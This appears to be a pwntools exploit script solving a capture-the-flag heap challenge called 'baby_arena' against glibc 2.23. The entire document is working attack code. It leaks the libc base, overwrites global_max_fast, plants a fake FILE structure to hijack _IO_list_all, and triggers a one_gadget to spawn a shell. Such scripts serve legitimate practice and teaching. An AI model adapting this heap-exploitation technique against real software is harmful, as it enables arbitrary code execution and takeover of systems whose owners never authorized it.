from pwn import *
local = 1
one_gadget = [0x45216 , 0x4526a , 0xf02a4 , 0xf1147]
if local:
    p = process('./baby_arena')
    libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
else:
    print 'time is up;'

def dbg():
    raw_input()

def create(size , note):
    p.recvuntil('exit\n')
    p.sendline('1')
    p.recvuntil('size\n')
    p.sendline(str(size))
    p.recvuntil('note\n')
    p.sendline(note)
    p.recvuntil('is\n')
    note_is = p.recvuntil('\n')[:-1]
    p.recvuntil('successed\n')
    return note_is

def delete(id):
    p.recvuntil('exit\n')
    p.sendline('2')
    p.recvuntil('id:\n')
    p.sendline(str(id))
    p.recvuntil('order!\n')

def login(name , is_admin):
    p.recvuntil('exit\n')
    p.sendline('3')
    p.recvuntil('name\n')
    p.sendline(name)
    p.recvuntil('admin\n')
    p.sendline(str(is_admin))

def debug():
    print pidof(p)[0]
    raw_input()

#make fake_file to trigger FSOP
fake_file = 'a' * (0x20 - 0x10)     #padding
fake_file += p64(0)                 #write_base => offset_0x20
fake_file += p64(1)                 #write_ptr  => offset_0x28
fake_file += 'b' * (0xb8 - 0x28)    #padding
fake_file += p64(0)                 #mode       => offset_0xc0
fake_file += 'c' * (0xd0 - 0xc0)    #padding
fake_file += p64(0x6020b0 - 0x18)   #vtable     => offset_0xd8

#leak libc_base and get some important addr
create(0xa0 , '1' * 0xa0)           #0
create(0xa0 , '2' * 0xa0)           #1
create(0x1400 , fake_file)          #2  free to fastbin and overwrite IO_list_all
delete(0)

gdb.attach(p, 'b* 0x400B1E ')
dbg()

leak = create(0xa0 , '3' * 8)
libc.address = u64(leak[8:].ljust(8 , '\x00')) - 0x3c4b78
global_max_fast_addr = libc.address + 0x3c67f8
IO_list_all_addr = libc.symbols['_IO_list_all']
success('libc_base => ' + hex(libc.address))
success('global_max_fast => ' + hex(global_max_fast_addr))
success('IO_list_all => ' + hex(IO_list_all_addr))

#overwrite global_mas_fast and free chunk2 to overwrite IO_list_all to fake_file 
login(p64(libc.address + one_gadget[1]) + p64(global_max_fast_addr - 8) , 0)
p.recvuntil('wrong choice\n')
delete(2)
#debug()

#exit() and exec one_gadget to get shell
p.recv(1024)
p.sendline('4')
p.interactive()